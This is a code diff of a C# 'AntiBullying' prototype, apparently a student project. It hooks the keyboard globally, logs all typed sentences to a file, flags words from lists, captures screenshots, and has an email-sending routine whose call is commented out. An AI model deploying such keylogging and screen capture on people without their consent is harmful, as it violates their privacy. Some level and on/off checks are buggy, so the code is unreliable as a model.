@@ -27,6 +27,7 @@ namespace KeyTrackerBase
         int iScreen = 0;
 
         //reads .txt files into arrays
+       // string[] words;
         string[] words;
         string[] low = File.ReadAllLines(@"C:\\Users\\Jon\\Desktop\\GroupProjectUpdated\\KeyTrackerBase\\low.txt");
         string[] medium = File.ReadAllLines(@"C:\\Users\\Jon\\Desktop\\GroupProjectUpdated\\KeyTrackerBase\\medium.txt");
@@ -39,36 +40,31 @@ namespace KeyTrackerBase
 
         public Form1()
         {
+
             #region Form & System Tray
             //hide form
             this.WindowState = FormWindowState.Minimized;
             this.ShowInTaskbar = false;
 
             //Load icon
-            applicationIcon = new Icon("C:\\Users\\Jon\\Desktop\\GroupProjectUpdated\\KeyTrackerBase\\f_Owl_Icon.ico");
-
-            //show system tray icon and assign the icon for it
-            systemTrayIcon = new NotifyIcon();
-            systemTrayIcon.Icon = applicationIcon;
-            systemTrayIcon.Visible = true;
-
-            //creates the menu in the system tray icon
-            MenuItem quitMenuItem = new MenuItem("Quit");
-            MenuItem programName = new MenuItem("AntiBullying Prototype v0.3");
-            MenuItem settingsItem = new MenuItem("Settings");
-            ContextMenu systemTrayMenu = new ContextMenu();
-            systemTrayMenu.MenuItems.Add(programName);
-            systemTrayMenu.MenuItems.Add(settingsItem);
-            systemTrayMenu.MenuItems.Add(quitMenuItem);
-            systemTrayIcon.ContextMenu = systemTrayMenu;
-
-            //creates events for the specific menu items
-            quitMenuItem.Click +=quitMenuItem_Click;
-            settingsItem.Click += settingsItem_Click;
+            switch (settings[1])
+            {
+                case "On":
+                    applicationIcon = new Icon("C:\\Users\\Jon\\Desktop\\GroupProjectUpdated\\KeyTrackerBase\\f_Owl_Icon.ico");
+                    systemTray("Quit", "AntiBullying Prototype v0.4", "Settings");
+                    break;
+                case "Off":
+                    applicationIcon = new Icon("C:\\Users\\Jon\\Desktop\\GroupProjectUpdated\\KeyTrackerBase\\f_Owl_Icon_off.ico");
+                    systemTray("Quit", "AntiBullying Prototype v0.4 - Disabled", "Settings");
+                    break;
+                default:
+                    MessageBox.Show("Please contact technical support regarding:\n\nERROR01 - Settings - Invalid switch option");
+                    break;
+            }
 
             InitializeComponent();
-#endregion
-            
+            #endregion
+
             #region Keys to watch
             gkh.KeyDown += new System.Windows.Forms.KeyEventHandler(gkh_KeyDown);
             gkh.KeyUp += new System.Windows.Forms.KeyEventHandler(gkh_KeyUp);
@@ -78,27 +74,59 @@ namespace KeyTrackerBase
 
             #endregion
 
-            #region Word Checker
+            #region Word Checker - Level
+
+            //array to use for combined arrays (for different levels)
+            
 
             //hierarchy level of words
             switch (settings[4])
             {
-                case "low":
-                    words = File.ReadAllLines(@"C:\\Users\\Jon\\Desktop\\GroupProjectUpdated\\KeyTrackerBase\\low.txt");
+                case "All (Recommended)":
+                    words =  new string[low.Length + medium.Length + high.Length];
+                    low.CopyTo(words, 0);//adds a copy of the low array to the beginning of the new array
+                    medium.CopyTo(words, low.Length);//same but at the end of the length of low
+                    high.CopyTo(words, low.Length + medium.Length);//same but end of the length of low and medium
                     break;
-                case "medium":
-
+                case "High/Medium":
+                    words =  new string[low.Length + medium.Length + high.Length];
+                    medium.CopyTo(words, 0);//adds a copy of the low array to the beginning of the new array
+                    high.CopyTo(words, medium.Length);//same but at the end of the length of low
                     break;
-                case "High":
-
+                case "Medium/Low":
+                    words =  new string[low.Length + medium.Length + high.Length];
+                    medium.CopyTo(words, 0);//adds a copy of the low array to the beginning of the new array
+                    high.CopyTo(words, medium.Length);//same but at the end of the length of low
                     break;
                 default:
-
+                    MessageBox.Show("Please contact technical support regarding:\n\nERROR02 - Settings - Invalid level detection option");
                     break;
             }
 
             #endregion
 
+        }
+
+        public void systemTray(string quit, string name, string settings)
+        {
+            //show system tray icon and assign the icon for it
+            systemTrayIcon = new NotifyIcon();
+            systemTrayIcon.Icon = applicationIcon;
+            systemTrayIcon.Visible = true;
+
+            //creates the menu in the system tray icon
+            MenuItem quitMenuItem = new MenuItem(quit);
+            MenuItem programName = new MenuItem(name);
+            MenuItem settingsItem = new MenuItem(settings);
+            ContextMenu systemTrayMenu = new ContextMenu();
+            systemTrayMenu.MenuItems.Add(programName);
+            systemTrayMenu.MenuItems.Add(settingsItem);
+            systemTrayMenu.MenuItems.Add(quitMenuItem);
+            systemTrayIcon.ContextMenu = systemTrayMenu;
+
+            //creates events for the specific menu items
+            quitMenuItem.Click += quitMenuItem_Click;
+            settingsItem.Click += settingsItem_Click;
         }
 
         //opens settings form on click in menu
@@ -107,6 +135,7 @@ namespace KeyTrackerBase
             Settings settingsForm = new Settings();
             settingsForm.Show();
         }
+
         //quits the program
         void quitMenuItem_Click(object sender, EventArgs e)
         {
@@ -118,133 +147,173 @@ namespace KeyTrackerBase
 
         private void KeyPressMod(object sender, System.Windows.Forms.KeyPressEventArgs e)
         {
-                
+
         }
 
         void gkh_KeyDown(object sender, System.Windows.Forms.KeyEventArgs e)
         {
-            RoutedEventArgs f = new RoutedEventArgs();
-
-            //counts characters
-            countChar++;
-
-            #region Spacebar
-            if (e.KeyCode == Keys.Space)
-                countWord++;
-            #endregion
-
-            #region Shift - NOT WORKING (YET)
-            if (e.KeyCode == Keys.LShiftKey || e.KeyCode == Keys.RShiftKey)
-                //shift = true;//turns shift on for next char
-            #endregion
-
-            #region Backspace
-            if (e.KeyCode == Keys.Back)
+            if (settings[1] == "on")
             {
-                if (sentence != "")
+                RoutedEventArgs f = new RoutedEventArgs();
+
+                //counts characters
+                countChar++;
+
+                //DEFINE CERTAIN KEYS 
+                #region Spacebar
+                if (e.KeyCode == Keys.Space)
+                    countWord++;
+                #endregion
+
+                #region Backspace
+                if (e.KeyCode == Keys.Back)
                 {
-                    sentence = sentence.Remove(sentence.Length - 1);
-                    textBox1.Text = sentence;
-                    e.Handled = false;
-                }
-            }
-            #endregion
-
-            #region Return
-            if (e.KeyCode == Keys.Return)
-            {
-
-            }
-            #endregion
-
-            
-
-            //MIGHT BE WORTH ADDING A VARYING TIMER TO RECORD TEXT IN THE PAST _ MINUTES
-            #region New Key Logger (Main) - User
-
-            if (e.KeyCode != Keys.Back)
-            {
-                sentence += ((char)e.KeyValue).ToString().ToLower();
-                textBox1.Text = sentence;
-
-                #region Word Detector
-
-                if (sentence != "\r")
+                    if (sentence != "")
                     {
-                        if (sentence != "¾")
+                        sentence = sentence.Remove(sentence.Length - 1);
+                        textBox1.Text = sentence;
+                        e.Handled = false;
+                    }
+                }
+                #endregion
+                //MIGHT BE WORTH ADDING A VARYING TIMER TO RECORD TEXT IN THE PAST _ MINUTES
+                #region New Key Logger (Main) - User
+
+                if (e.KeyValue != 160)//ensures 'shift' isnt entered as a key
+                {
+                    if (e.KeyCode != Keys.Back)//ensures no 'backspaces'
+                    {
+                        if (e.KeyValue != 188)//ensures no 'commars'
                         {
-                            if (countWord == 30 || countChar == 180 || e.KeyCode == Keys.OemPeriod || e.KeyCode == Keys.Return)
+                            if (e.Shift != true && e.KeyValue != 49)//exclamation
                             {
-                                if (sentence != "")
+                                if (e.Shift != true && e.KeyValue != 191)//question mark
                                 {
-                                    using (StreamWriter file = new StreamWriter(@"C:\\Users\\Jon\\Desktop\\GroupProjectUpdated\\KeyTrackerBase\\log.txt", true))
+                                    sentence += ((char)e.KeyValue).ToString().ToLower();
+                                    textBox1.Text = sentence;
+
+                                    if (sentence != "\r")//ensures no 'returns' are by themself
                                     {
-                                        if (e.KeyCode != Keys.OemPeriod)
+                                        if (sentence != "¾")//ensures no 'fullstops' are by themself
                                         {
-                                            //writes entries to txt file - logger
-                                            file.WriteLine(DateTime.Now.ToString() + ":  " + sentence);
-                                            //word detection
-                                            for (int i = 0; i < words.Length; i++)
+                                            if (countWord == 30 || countChar == 180 || e.KeyCode == Keys.OemPeriod || e.KeyCode == Keys.Return)
                                             {
-                                                if (sentence.Contains(words[i]))
+                                                if (sentence != "" || e.Shift != true)
                                                 {
-                                                    countDetect++;
-                                                    badWords += words[i] + " ";
+                                                    //loads the log file to write into
+                                                    using (StreamWriter file = new StreamWriter(@"C:\\Users\\Jon\\Desktop\\GroupProjectUpdated\\KeyTrackerBase\\log.txt", true))
+                                                    {
 
-                                                    
+                                                        if (e.KeyCode != Keys.OemPeriod)
+                                                        {
+
+                                                            //writes entries to txt file - logger
+                                                            file.WriteLine(DateTime.Now.ToString() + ":  " + sentence);
+                                                            //calls function to detect for words
+                                                            wordDetector(file);
+
+                                                        }
+
+                                                        //FULL STOP (PERIOD) LOGGING
+                                                        else if (e.KeyCode == Keys.OemPeriod)
+                                                        {
+
+                                                            //writes entries to txt file, removes period symbol and puts fullstop - logger
+                                                            file.WriteLine(DateTime.Now.ToString() + ":  " + sentence.Remove(sentence.Length - 1) + ".");
+                                                            wordDetector(file);
+
+                                                        }
+
+                                                        //string and ints reset
+                                                        sentence = "";
+                                                        countWord = 0;
+                                                        countChar = 0;
+                                                        countDetect = 0;
+                                                        badWords = "";
+                                                        file.Close();
+                                                    }
                                                 }
-
                                             }
-                                            file.WriteLine("Amount of Words Detected: " + countDetect + " - Words: " + badWords);
-                                                    //capture screenshot & send email with it and log message
-                                                    //http://www.mindfiresolutions.com/How-to-take-screenshot-programmatically-and-mail-it-in-C-647.php
-                                                    Bitmap screencapture = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
-                                                    Graphics graphics = Graphics.FromImage(screencapture as Image);
-                                                    graphics.CopyFromScreen(0, 0, 0, 0, screencapture.Size);
-                                                    screencapture.Save(@"C:\\Users\\Jon\\Desktop\\screenshot" + iScreen + ".jpeg", System.Drawing.Imaging.ImageFormat.Jpeg);
-                                                    
-                                                    SendEmail(settings[0], "User: " + userName + badWords, "Sentence: " + sentence, @"C:\\Users\\Jon\\Desktop\\screenshot" + iScreen + ".jpeg");
-                                                    iScreen++;
-
                                         }
                                         else
-                                        {
-                                            //writes entries to txt file, removes period symbol and puts fullstop - logger
-                                            file.WriteLine(DateTime.Now.ToString() + ":  " + sentence.Remove(sentence.Length - 1) + ".");
-                                        }
-                                        //string and ints reset
-                                        sentence = "";
-                                        countWord = 0;
-                                        countChar = 0;
-                                        countDetect = 0;
-                                        badWords = "";
-                                        file.Close();
+                                            sentence = "";
                                     }
+                                    else
+                                        sentence = "";
                                 }
+                                else
+                                    sentence += "?";
                             }
+                            else
+                                sentence += "!";
                         }
                         else
-                            sentence = "";
+                            sentence += ",";
                     }
-                    else
-                        sentence = "";
+                }
                 #endregion
             }
+            else
+            {
 
-            #endregion
+            }
         }
 
 
         void gkh_KeyUp(object sender, System.Windows.Forms.KeyEventArgs e)
         {
             //Put keyup events in here (if necessary)
+            //DELETE IF UNUSED - ALSO IN GLOBALKEYHOOK!!!
         }
 
-        public void Form1_Load(object sender, EventArgs e)
+        //WORD DETECTION WORDING PERFECTLY!
+        public void wordDetector(StreamWriter file)
         {
-            
+            //word detection begin - adds the words and the amount of words found in sentence to vars
+            for (int i = 0; i < words.Length; i++)
+            {
+                if (sentence.Contains(words[i]))
+                {
+                    countDetect++;
+                    badWords += words[i] + " ";
+                }
+
+            }
+
+            //SENDS WORDS AND SCREENSHOT TO EMAIL IF THE AMOUNT DETECTED IS > THAN 0
+            if (countDetect > 0)
+            {
+                file.WriteLine("Amount of Words Detected: " + countDetect + " - Words: " + badWords);
+                //capture screenshot & send email with it and log message
+                //uses chosen format for screenshot
+
+                Bitmap screencapture = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+                Graphics graphics = Graphics.FromImage(screencapture as Image);
+                switch (settings[2])
+                {
+                    case "JPEG":
+                        graphics.CopyFromScreen(0, 0, 0, 0, screencapture.Size);
+                        screencapture.Save(@"C:\\Users\\Jon\\Desktop\\screenshot" + iScreen + ".jpeg", System.Drawing.Imaging.ImageFormat.Jpeg);
+                        break;
+                    case "PNG":
+                        graphics.CopyFromScreen(0, 0, 0, 0, screencapture.Size);
+                        screencapture.Save(@"C:\\Users\\Jon\\Desktop\\screenshot" + iScreen + ".png", System.Drawing.Imaging.ImageFormat.Png);
+                        break;
+                    case "GIF":
+                        graphics.CopyFromScreen(0, 0, 0, 0, screencapture.Size);
+                        screencapture.Save(@"C:\\Users\\Jon\\Desktop\\screenshot" + iScreen + ".gif", System.Drawing.Imaging.ImageFormat.Gif);
+                        break;
+                    default:
+                        break;
+                }
+
+                //SendEmail(settings[0], "User: " + userName + " " + badWords, "Sentence: " + sentence, @"C:\\Users\\Jon\\Desktop\\screenshot" + iScreen + settings[2].ToLower());
+                iScreen++;
+
+            }
         }
 
+        //EMAIL WORKING PERFECTLY! - ADD TIME AND DATE STAMP
         public void SendEmail(string to, string subject, string body, string path)
         {
             try
